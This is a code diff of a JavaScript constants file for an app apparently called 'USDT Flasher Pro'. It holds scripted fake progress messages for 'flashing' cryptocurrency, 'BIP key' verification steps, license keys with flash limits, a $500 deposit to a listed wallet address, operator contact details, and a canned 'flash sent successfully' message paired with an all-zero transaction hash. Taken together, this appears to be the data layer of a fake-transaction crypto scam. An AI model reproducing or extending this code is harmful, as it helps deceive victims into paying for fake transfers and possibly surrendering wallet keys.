@@ -1,5 +1,5 @@
 // Initial loading messages for the flash process
-const initialLoadingMessages = [
+export const initialLoadingMessages = [
   "Initializing system protocols, please wait…",
   "Establishing secure connection, loading configurations…",
   "Preparing environment, verifying essential components…",
@@ -18,7 +18,7 @@ const initialLoadingMessages = [
 ];
 
 // License verification messages
-const licenseVerificationMessages = [
+export const licenseVerificationMessages = [
   "Verifying license key, please wait…",
   "Authenticating license, checking database records…",
   "Validating license integrity, ensuring compliance…",
@@ -32,7 +32,7 @@ const licenseVerificationMessages = [
 ];
 
 // BIP key verification messages
-const bipVerificationMessages = [
+export const bipVerificationMessages = [
   "Verifying BIP key, please wait…",
   "Authenticating BIP key, checking security layers…",
   "Validating key format, ensuring compliance…",
@@ -82,11 +82,12 @@ const bipVerificationMessages = [
   "Locking transaction details, ensuring future verification…",
   "Data integrity confirmed, finalizing ledger entry…",
   "Secure transaction closed, logging final confirmation…",
-  "Flash process fully executed…"
+  "Flash process fully executed…",
+  "Transaction permanently recorded on blockchain…"
 ];
 
 // Payment status messages
-const paymentStatusMessages = [
+export const paymentStatusMessages = [
   "Verifying payment, please wait…",
   "Authenticating transaction, checking blockchain records…",
   "Validating payment details, ensuring compliance…",
@@ -100,7 +101,7 @@ const paymentStatusMessages = [
 ];
 
 // Dropdown data
-const walletOptions = [
+export const walletOptions = [
   'MetaMask',
   'Trust Wallet',
   'Coinbase Wallet',
@@ -123,7 +124,7 @@ const walletOptions = [
   'Kraken Wallet'
 ];
 
-const currencyOptions = [
+export const currencyOptions = [
   'USD (US Dollar)',
   'EUR (Euro)',
   'GBP (British Pound)',
@@ -131,7 +132,7 @@ const currencyOptions = [
   'CNY (Chinese Yuan)'
 ];
 
-const networkOptions = [
+export const networkOptions = [
   'TRC20 (Tron)',
   'ERC20 (Ethereum)',
   'BEP20 (Binance Smart Chain)',
@@ -139,18 +140,77 @@ const networkOptions = [
   'MATIC (Polygon)'
 ];
 
-const dayOptions = ['0', '1', '2', '3', '5', '7', '14', '30'];
-const minuteOptions = ['0', '15', '30', '45', '60', '120', '240'];
+export const dayOptions = ['0', '1', '2', '3', '5', '7', '14', '30'];
+export const minuteOptions = ['0', '15', '30', '45', '60', '120', '240'];
 
-// Export all constants
-module.exports = {
-  initialLoadingMessages,
-  licenseVerificationMessages,
-  bipVerificationMessages,
-  paymentStatusMessages,
-  walletOptions,
-  currencyOptions,
-  networkOptions,
-  dayOptions,
-  minuteOptions
+// Fallback data (used when API is unavailable)
+export const fallbackLicenseKeys = [
+  {
+    id: 1,
+    key: 'USDT-ABCD-1234-EFGH-5678',
+    status: 'active',
+    created_at: '2025-01-15T10:30:00.000Z',
+    expires_at: '2026-01-15T10:30:00.000Z',
+    user: 'test@gmail.com',
+    type: 'demo',
+    maxAmount: 30
+  },
+  {
+    id: 2,
+    key: 'USDT-IJKL-9012-MNOP-3456',
+    status: 'active',
+    created_at: '2025-02-20T14:45:00.000Z',
+    expires_at: '2026-02-20T14:45:00.000Z',
+    user: 'live@gmail.com',
+    type: 'live',
+    maxAmount: 10000000
+  },
+  {
+    id: 3,
+    key: 'YGMI-7B5L-GVUF-SL1Q',
+    status: 'active',
+    created_at: '2025-03-05T10:00:00.000Z',
+    expires_at: '2026-03-05T10:00:00.000Z',
+    user: 'live@gmail.com',
+    type: 'live',
+    maxAmount: 10000000
+  }
+];
+
+export const fallbackContactInfo = {
+  primaryPhone: '+447013216​28',
+  secondaryPhone: '+14693510740',
+  tertiaryPhone: '+91 7823232332',
+  email: 'support@usdtflasherpro.com',
+  website: 'https://usdtflasherpro.com',
+  telegramUsername: '@usdtflasherpro',
+  discordServer: 'discord.gg/usdtflasherpro'
+};
+
+export const fallbackAppSettings = {
+  appVersion: '4.8',
+  updateChannel: 'stable',
+  autoUpdate: true,
+  theme: 'dark',
+  accentColor: '#00e6b8',
+  animationsEnabled: true,
+  sessionTimeout: 30,
+  requirePasswordOnStartup: true,
+  twoFactorAuth: false,
+  defaultNetwork: 'trc20',
+  demoMaxFlashAmount: 30,
+  liveMaxFlashAmount: 10000000,
+  defaultDelayDays: 0,
+  defaultDelayMinutes: 0,
+  debugMode: false,
+  logLevel: 'info',
+  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
+  // Payment settings
+  depositAmount: 500,
+  transactionFee: 'Transaction Fee',
+  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
+  // Success modal settings
+  successTitle: 'Success',
+  successMessage: 'The flash has been sent successfully',
+  transactionHash: '000000000000000000000000000000000000'
 };
